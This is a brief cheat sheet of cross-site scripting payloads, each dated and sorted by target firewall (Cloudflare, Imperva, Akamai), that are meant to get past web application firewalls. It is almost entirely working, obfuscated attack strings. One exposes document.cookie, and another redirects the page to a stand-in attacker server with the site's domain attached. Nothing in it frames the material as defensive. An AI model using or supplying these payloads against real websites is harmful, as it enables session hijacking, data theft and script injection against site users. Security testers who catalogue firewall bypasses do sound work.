# XSS WAF Bypasses

### Cloudflare

```javascript
//22-05-2021:
"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;

//12-04-2021:
<svg/onload=location/**/='https://your.server/'+document.domain>

//25-02-2021:
<svg onx=() onload=(confirm)(1)>

//11-01-2021:
<svg onload=alert%26%230000000040"1")>

//23-12-2020:
<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
```

### Imperva

```javascript
//24-02-2021:
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
```

### Akamai

```javascript
//13-12-2020:
<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
```

